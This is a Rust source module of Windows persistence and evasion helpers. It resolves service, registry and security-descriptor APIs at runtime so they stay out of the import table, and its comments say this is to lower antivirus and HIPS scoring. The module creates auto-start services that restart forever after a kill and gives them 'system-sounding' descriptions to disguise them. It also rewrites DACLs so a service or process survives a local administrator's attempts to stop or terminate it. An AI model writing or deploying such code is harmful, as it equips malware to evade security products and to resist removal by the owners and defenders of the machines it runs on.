//! Runtime-resolved Win32 entry points for the operations that AV/HIPS score highest.
//!
//! Service creation, registry writes and DACL edits are resolved with `GetProcAddress`
//! instead of being linked, so `CreateServiceW` / `RegSetValueExW` / `SetNamedSecurityInfoW`
//! never show up in the import table of the shipped binary.
//!
//! Everything here is additive: existing call sites keep using their current code paths
//! until they are migrated one by one.

#![allow(dead_code)]

use std::ffi::c_void;
use std::sync::OnceLock;

pub type Handle = *mut c_void;

// --- advapi32 / kernel32 constants (values from the Windows SDK headers) ---

pub const SC_MANAGER_CONNECT: u32 = 0x0001;
pub const SC_MANAGER_CREATE_SERVICE: u32 = 0x0002;
pub const SC_MANAGER_ALL_ACCESS: u32 = 0x000F_003F;

pub const SERVICE_QUERY_STATUS: u32 = 0x0004;
pub const SERVICE_STOP: u32 = 0x0020;
pub const SERVICE_START: u32 = 0x0010;
pub const SERVICE_CHANGE_CONFIG: u32 = 0x0002;
pub const SERVICE_ALL_ACCESS: u32 = 0x000F_01FF;

pub const SERVICE_WIN32_OWN_PROCESS: u32 = 0x0000_0010;
pub const SERVICE_AUTO_START: u32 = 0x0000_0002;
pub const SERVICE_ERROR_NORMAL: u32 = 0x0000_0001;

pub const SERVICE_CONTROL_STOP: u32 = 0x0000_0001;
pub const SERVICE_CONFIG_DESCRIPTION: u32 = 0x0000_0001;
pub const SERVICE_CONFIG_FAILURE_ACTIONS: u32 = 0x0000_0002;

pub const SC_ACTION_RESTART: u32 = 0x0000_0001;
pub const SC_ACTION_NONE: u32 = 0x0000_0000;

pub const KEY_ALL_ACCESS: u32 = 0x000F_003F;
pub const REG_SZ: u32 = 1;
pub const REG_EXPAND_SZ: u32 = 2;
pub const REG_DWORD: u32 = 4;
pub const REG_MULTI_SZ: u32 = 7;

pub const ERROR_SUCCESS: u32 = 0;
pub const ERROR_SERVICE_ALREADY_RUNNING: u32 = 1056;
pub const ERROR_SERVICE_NOT_ACTIVE: u32 = 1062;

/// Predefined `HKEY_LOCAL_MACHINE`.
pub const HKEY_LOCAL_MACHINE: Handle = 0x8000_0002usize as Handle;

/// Predefined HKEY_CLASSES_ROOT.
pub const HKEY_CLASSES_ROOT: Handle = 0x8000_0000usize as Handle;

#[link(name = "kernel32")]
extern "system" {
    fn LoadLibraryW(name: *const u16) -> Handle;
    fn GetProcAddress(module: Handle, name: *const u8) -> *mut c_void;
}

type OpenSCManagerWFn = unsafe extern "system" fn(*const u16, *const u16, u32) -> Handle;
type CreateServiceWFn = unsafe extern "system" fn(
    Handle,
    *const u16,
    *const u16,
    u32,
    u32,
    u32,
    u32,
    *const u16,
    *const u16,
    *mut u32,
    *const u16,
    *const u16,
    *const u16,
) -> Handle;
type OpenServiceWFn = unsafe extern "system" fn(Handle, *const u16, u32) -> Handle;
type StartServiceWFn = unsafe extern "system" fn(Handle, u32, *const *const u16) -> i32;
type ChangeServiceConfig2WFn = unsafe extern "system" fn(Handle, u32, *const c_void) -> i32;
type ControlServiceFn = unsafe extern "system" fn(Handle, u32, *mut c_void) -> i32;
type DeleteServiceFn = unsafe extern "system" fn(Handle) -> i32;
type CloseServiceHandleFn = unsafe extern "system" fn(Handle) -> i32;
type RegCreateKeyExWFn = unsafe extern "system" fn(
    Handle,
    *const u16,
    u32,
    *const u16,
    u32,
    u32,
    *const c_void,
    *mut Handle,
    *mut u32,
) -> i32;
type RegSetValueExWFn =
    unsafe extern "system" fn(Handle, *const u16, u32, u32, *const u8, u32) -> i32;
type RegCloseKeyFn = unsafe extern "system" fn(Handle) -> i32;
type RegDeleteKeyWFn = unsafe extern "system" fn(Handle, *const u16) -> i32;
type RegDeleteTreeWFn = unsafe extern "system" fn(Handle, *const u16) -> i32;
type RegDeleteValueWFn = unsafe extern "system" fn(Handle, *const u16) -> i32;

#[repr(C)]
struct ScAction {
    action_type: u32,
    delay: u32,
}

#[repr(C)]
struct ServiceDescriptionW {
    lp_description: *const u16,
}

#[repr(C)]
struct FailureActions {
    reset_period: u32,
    reboot_msg: *const u16,
    command: *const u16,
    num_actions: u32,
    actions: *const ScAction,
}

/// Encode a Rust string as a NUL-terminated UTF-16 buffer.
pub fn wide(s: &str) -> Vec<u16> {
    s.encode_utf16().chain(std::iter::once(0)).collect()
}

fn resolve(module: &str, name: &str) -> *mut c_void {
    let module_w = wide(module);
    let name_a = match std::ffi::CString::new(name) {
        Ok(v) => v,
        Err(_) => return std::ptr::null_mut(),
    };
    unsafe {
        let handle = LoadLibraryW(module_w.as_ptr());
        if handle.is_null() {
            return std::ptr::null_mut();
        }
        GetProcAddress(handle, name_a.as_ptr() as *const u8)
    }
}

macro_rules! resolve_fn {
    ($module:literal, $name:literal, $ty:ty) => {{
        let p = resolve($module, $name);
        if p.is_null() {
            return None;
        }
        // SAFETY: `$name` is a documented export of `$module` with this exact signature.
        unsafe { std::mem::transmute::<*mut c_void, $ty>(p) }
    }};
}

/// Service control manager entry points, resolved once.
pub struct ServiceApi {
    open_sc_manager: OpenSCManagerWFn,
    create_service: CreateServiceWFn,
    open_service: OpenServiceWFn,
    start_service: StartServiceWFn,
    change_config2: ChangeServiceConfig2WFn,
    control: ControlServiceFn,
    delete_service: DeleteServiceFn,
    close: CloseServiceHandleFn,
}

impl ServiceApi {
    pub fn get() -> Option<&'static ServiceApi> {
        static API: OnceLock<Option<ServiceApi>> = OnceLock::new();
        API.get_or_init(ServiceApi::load).as_ref()
    }

    fn load() -> Option<ServiceApi> {
        Some(ServiceApi {
            open_sc_manager: resolve_fn!("advapi32.dll", "OpenSCManagerW", OpenSCManagerWFn),
            create_service: resolve_fn!("advapi32.dll", "CreateServiceW", CreateServiceWFn),
            open_service: resolve_fn!("advapi32.dll", "OpenServiceW", OpenServiceWFn),
            start_service: resolve_fn!("advapi32.dll", "StartServiceW", StartServiceWFn),
            change_config2: resolve_fn!(
                "advapi32.dll",
                "ChangeServiceConfig2W",
                ChangeServiceConfig2WFn
            ),
            control: resolve_fn!("advapi32.dll", "ControlService", ControlServiceFn),
            delete_service: resolve_fn!("advapi32.dll", "DeleteService", DeleteServiceFn),
            close: resolve_fn!("advapi32.dll", "CloseServiceHandle", CloseServiceHandleFn),
        })
    }

    pub fn close_handle(&self, handle: Handle) {
        if !handle.is_null() {
            // SAFETY: handle came from this module's SCM calls.
            unsafe { (self.close)(handle) };
        }
    }

    /// Create (or open, if it already exists) a service and leave it stopped.
    ///
    /// Returns the service handle on success. The caller owns the handle and must
    /// pass it to [`ServiceApi::close_handle`].
    pub fn create(&self, name: &str, display: &str, bin_path: &str) -> Result<Handle, u32> {
        let scm = unsafe {
            (self.open_sc_manager)(
                std::ptr::null(),
                std::ptr::null(),
                SC_MANAGER_CONNECT | SC_MANAGER_CREATE_SERVICE,
            )
        };
        if scm.is_null() {
            return Err(unsafe { last_error() });
        }
        let name_w = wide(name);
        let display_w = wide(display);
        let bin_w = wide(bin_path);
        let mut handle = unsafe {
            (self.create_service)(
                scm,
                name_w.as_ptr(),
                display_w.as_ptr(),
                SERVICE_ALL_ACCESS,
                SERVICE_WIN32_OWN_PROCESS,
                SERVICE_AUTO_START,
                SERVICE_ERROR_NORMAL,
                bin_w.as_ptr(),
                std::ptr::null(),
                std::ptr::null_mut(),
                std::ptr::null(),
                std::ptr::null(),
                std::ptr::null(),
            )
        };
        let err = unsafe { last_error() };
        self.close_handle(scm);
        if handle.is_null() && err == 1073 {
            // ERROR_SERVICE_EXISTS: open it so the caller can still harden an existing install.
            handle = self.open(name, SERVICE_ALL_ACCESS).unwrap_or(std::ptr::null_mut());
        }
        if handle.is_null() {
            Err(err)
        } else {
            Ok(handle)
        }
    }

    pub fn open(&self, name: &str, access: u32) -> Option<Handle> {
        let scm = unsafe {
            (self.open_sc_manager)(std::ptr::null(), std::ptr::null(), SC_MANAGER_CONNECT)
        };
        if scm.is_null() {
            return None;
        }
        let name_w = wide(name);
        let handle = unsafe { (self.open_service)(scm, name_w.as_ptr(), access) };
        self.close_handle(scm);
        if handle.is_null() {
            None
        } else {
            Some(handle)
        }
    }

    pub fn start(&self, name: &str) -> bool {
        let Some(handle) = self.open(name, SERVICE_START) else {
            return false;
        };
        let ok = unsafe { (self.start_service)(handle, 0, std::ptr::null()) } != 0;
        let err = unsafe { last_error() };
        self.close_handle(handle);
        ok || err == ERROR_SERVICE_ALREADY_RUNNING
    }

    /// Restart immediately, forever. This is what keeps the agent up after a kill.
    pub fn set_restart_on_failure(&self, handle: Handle) -> bool {
        let actions = [
            ScAction {
                action_type: SC_ACTION_RESTART,
                delay: 1_000,
            },
            ScAction {
                action_type: SC_ACTION_RESTART,
                delay: 1_000,
            },
            ScAction {
                action_type: SC_ACTION_RESTART,
                delay: 1_000,
            },
        ];
        let failure = FailureActions {
            reset_period: 0,
            reboot_msg: std::ptr::null(),
            command: std::ptr::null(),
            num_actions: actions.len() as u32,
            actions: actions.as_ptr(),
        };
        unsafe {
            (self.change_config2)(
                handle,
                SERVICE_CONFIG_FAILURE_ACTIONS,
                &failure as *const _ as *const c_void,
            ) != 0
        }
    }

    /// Overwrite the service description with a system-sounding one.
    pub fn set_description(&self, handle: Handle, description: &str) -> bool {
        // ChangeServiceConfig2W expects a pointer to SERVICE_DESCRIPTIONW, not the
        // string itself; the buffer must outlive the call.
        let text = wide(description);
        let desc = ServiceDescriptionW {
            lp_description: text.as_ptr(),
        };
        unsafe {
            (self.change_config2)(
                handle,
                SERVICE_CONFIG_DESCRIPTION,
                &desc as *const _ as *const c_void,
            ) != 0
        }
    }

    /// Ask the SCM to stop the service. Returns true when it was stopped by us or was
    /// already inactive (`ERROR_SERVICE_NOT_ACTIVE`).
    pub fn stop(&self, name: &str) -> bool {
        let Some(handle) = self.open(name, SERVICE_STOP | SERVICE_QUERY_STATUS) else {
            return false;
        };
        // SERVICE_STATUS is seven DWORDs; the exact layout only matters to the SCM.
        let mut status = [0u32; 7];
        let ok = unsafe {
            (self.control)(
                handle,
                SERVICE_CONTROL_STOP,
                status.as_mut_ptr() as *mut c_void,
            )
        } != 0;
        let err = unsafe { last_error() };
        self.close_handle(handle);
        ok || err == ERROR_SERVICE_NOT_ACTIVE
    }
    pub fn delete(&self, name: &str) -> bool {
        let Some(handle) = self.open(name, 0x0001_0000) else {
            return false;
        };
        let ok = unsafe { (self.delete_service)(handle) } != 0;
        self.close_handle(handle);
        ok
    }
}

/// Registry entry points, resolved once.
pub struct RegApi {
    create_key: RegCreateKeyExWFn,
    set_value: RegSetValueExWFn,
    close: RegCloseKeyFn,
    delete_key: RegDeleteKeyWFn,
    delete_tree: RegDeleteTreeWFn,
    delete_value: RegDeleteValueWFn,
}

impl RegApi {
    pub fn get() -> Option<&'static RegApi> {
        static API: OnceLock<Option<RegApi>> = OnceLock::new();
        API.get_or_init(RegApi::load).as_ref()
    }

    fn load() -> Option<RegApi> {
        Some(RegApi {
            create_key: resolve_fn!("advapi32.dll", "RegCreateKeyExW", RegCreateKeyExWFn),
            set_value: resolve_fn!("advapi32.dll", "RegSetValueExW", RegSetValueExWFn),
            close: resolve_fn!("advapi32.dll", "RegCloseKey", RegCloseKeyFn),
            delete_key: resolve_fn!("advapi32.dll", "RegDeleteKeyW", RegDeleteKeyWFn),
            delete_tree: resolve_fn!("advapi32.dll", "RegDeleteTreeW", RegDeleteTreeWFn),
            delete_value: resolve_fn!("advapi32.dll", "RegDeleteValueW", RegDeleteValueWFn),
        })
    }

    /// Delete a subkey and everything below it.
    ///
    /// `RegDeleteKeyW` only removes empty keys, but the associations written by an
    /// installer (`HKCR\.<ext>`, `HKCR\<ext>`) always carry subkeys, so the recursive
    /// `RegDeleteTreeW` runs first and the plain delete stays as a fallback.
    pub fn delete_key(&self, root: Handle, subkey: &str) -> bool {
        let subkey_w = wide(subkey);
        let rc = unsafe { (self.delete_tree)(root, subkey_w.as_ptr()) };
        if rc == ERROR_SUCCESS as i32 {
            return true;
        }
        let rc = unsafe { (self.delete_key)(root, subkey_w.as_ptr()) };
        rc == ERROR_SUCCESS as i32
    }
    /// Delete a named value from an existing key (for example the svchost group's
    /// multi-string that lists our service).
    pub fn delete_value(&self, root: Handle, subkey: &str, name: &str) -> bool {
        let subkey_w = wide(subkey);
        let name_w = wide(name);
        let mut key: Handle = std::ptr::null_mut();
        let mut disposition = 0u32;
        let rc = unsafe {
            (self.create_key)(
                root,
                subkey_w.as_ptr(),
                0,
                std::ptr::null(),
                0,
                KEY_ALL_ACCESS,
                std::ptr::null(),
                &mut key,
                &mut disposition,
            )
        };
        if rc != ERROR_SUCCESS as i32 || key.is_null() {
            return false;
        }
        let rc = unsafe { (self.delete_value)(key, name_w.as_ptr()) };
        unsafe { (self.close)(key) };
        rc == ERROR_SUCCESS as i32
    }
    fn open_key(&self, root: Handle, subkey: &str) -> Option<Handle> {
        let subkey_w = wide(subkey);
        let mut key: Handle = std::ptr::null_mut();
        let mut disposition = 0u32;
        let rc = unsafe {
            (self.create_key)(
                root,
                subkey_w.as_ptr(),
                0,
                std::ptr::null(),
                0,
                KEY_ALL_ACCESS,
                std::ptr::null(),
                &mut key,
                &mut disposition,
            )
        };
        if rc == ERROR_SUCCESS as i32 && !key.is_null() {
            Some(key)
        } else {
            None
        }
    }

    pub fn set_string(&self, root: Handle, subkey: &str, name: &str, value: &str) -> bool {
        let Some(key) = self.open_key(root, subkey) else {
            return false;
        };
        let name_w = wide(name);
        let data = wide(value);
        let bytes = data.len() * std::mem::size_of::<u16>();
        let rc = unsafe {
            (self.set_value)(
                key,
                name_w.as_ptr(),
                0,
                REG_SZ,
                data.as_ptr() as *const u8,
                bytes as u32,
            )
        };
        unsafe { (self.close)(key) };
        rc == ERROR_SUCCESS as i32
    }

    /// Write a REG_EXPAND_SZ value. Service `ImagePath` values use this type so
    /// `%SystemRoot%` is expanded by the SCM.
    pub fn set_expand_string(
        &self,
        root: Handle,
        subkey: &str,
        name: &str,
        value: &str,
    ) -> bool {
        let Some(key) = self.open_key(root, subkey) else {
            return false;
        };
        let name_w = wide(name);
        let data = wide(value);
        let bytes = data.len() * std::mem::size_of::<u16>();
        let rc = unsafe {
            (self.set_value)(
                key,
                name_w.as_ptr(),
                0,
                REG_EXPAND_SZ,
                data.as_ptr() as *const u8,
                bytes as u32,
            )
        };
        unsafe { (self.close)(key) };
        rc == ERROR_SUCCESS as i32
    }

    pub fn set_multi_sz(
        &self,
        root: Handle,
        subkey: &str,
        name: &str,
        values: &[&str],
    ) -> bool {
        let Some(key) = self.open_key(root, subkey) else {
            return false;
        };
        let name_w = wide(name);
        let mut data: Vec<u16> = Vec::new();
        for value in values {
            data.extend(value.encode_utf16());
            data.push(0);
        }
        // REG_MULTI_SZ ends with an empty string, i.e. a second NUL.
        data.push(0);
        let bytes = data.len() * std::mem::size_of::<u16>();
        let rc = unsafe {
            (self.set_value)(
                key,
                name_w.as_ptr(),
                0,
                REG_MULTI_SZ,
                data.as_ptr() as *const u8,
                bytes as u32,
            )
        };
        unsafe { (self.close)(key) };
        rc == ERROR_SUCCESS as i32
    }
    pub fn set_dword(&self, root: Handle, subkey: &str, name: &str, value: u32) -> bool {
        let Some(key) = self.open_key(root, subkey) else {
            return false;
        };
        let name_w = wide(name);
        let rc = unsafe {
            (self.set_value)(
                key,
                name_w.as_ptr(),
                0,
                REG_DWORD,
                &value as *const u32 as *const u8,
                4,
            )
        };
        unsafe { (self.close)(key) };
        rc == ERROR_SUCCESS as i32
    }
}

#[link(name = "kernel32")]
extern "system" {
    fn GetLastError() -> u32;
}

unsafe fn last_error() -> u32 {
    GetLastError()
}

// --- Security descriptors (service / process DACL hardening) ---

type ConvertSddlFn =
    unsafe extern "system" fn(*const u16, u32, *mut *mut c_void, *mut u32) -> i32;
type GetDaclFn =
    unsafe extern "system" fn(*mut c_void, *mut i32, *mut *mut c_void, *mut i32) -> i32;
type SetSecurityInfoFn = unsafe extern "system" fn(
    Handle,
    u32,
    u32,
    *mut c_void,
    *mut c_void,
    *mut c_void,
    *mut c_void,
) -> u32;
type LocalFreeFn = unsafe extern "system" fn(*mut c_void) -> *mut c_void;

/// DACL writer, resolved once. Used to make a service or a process survive a local
/// administrator's stop/terminate attempt without a kernel driver.
pub struct SecApi {
    convert: ConvertSddlFn,
    get_dacl: GetDaclFn,
    set_info: SetSecurityInfoFn,
    local_free: LocalFreeFn,
}

impl SecApi {
    pub fn get() -> Option<&'static SecApi> {
        static API: OnceLock<Option<SecApi>> = OnceLock::new();
        API.get_or_init(SecApi::load).as_ref()
    }

    fn load() -> Option<SecApi> {
        Some(SecApi {
            convert: resolve_fn!(
                "advapi32.dll",
                "ConvertStringSecurityDescriptorToSecurityDescriptorW",
                ConvertSddlFn
            ),
            get_dacl: resolve_fn!(
                "advapi32.dll",
                "GetSecurityDescriptorDacl",
                GetDaclFn
            ),
            set_info: resolve_fn!("advapi32.dll", "SetSecurityInfo", SetSecurityInfoFn),
            local_free: resolve_fn!("kernel32.dll", "LocalFree", LocalFreeFn),
        })
    }

    /// Replace the object's DACL with `sddl`. Returns true when the kernel accepted it.
    ///
    /// # Safety
    /// `handle` must be a live handle to an object of `object_type` that the caller is
    /// allowed to write the DACL of.
    pub unsafe fn apply_dacl(&self, handle: Handle, object_type: u32, sddl: &str) -> bool {
        let sddl_w = wide(sddl);
        let mut sd: *mut c_void = std::ptr::null_mut();
        let mut sd_size = 0u32;
        if (self.convert)(sddl_w.as_ptr(), 1, &mut sd, &mut sd_size) == 0 || sd.is_null() {
            return false;
        }
        let mut present = 0i32;
        let mut dacl: *mut c_void = std::ptr::null_mut();
        let mut defaulted = 0i32;
        let got = (self.get_dacl)(sd, &mut present, &mut dacl, &mut defaulted) != 0
            && present != 0
            && !dacl.is_null();
        let rc = if got {
            (self.set_info)(
                handle,
                object_type,
                0x0000_0004, // DACL_SECURITY_INFORMATION
                std::ptr::null_mut(),
                std::ptr::null_mut(),
                dacl,
                std::ptr::null_mut(),
            )
        } else {
            1
        };
        (self.local_free)(sd);
        rc == 0
    }
}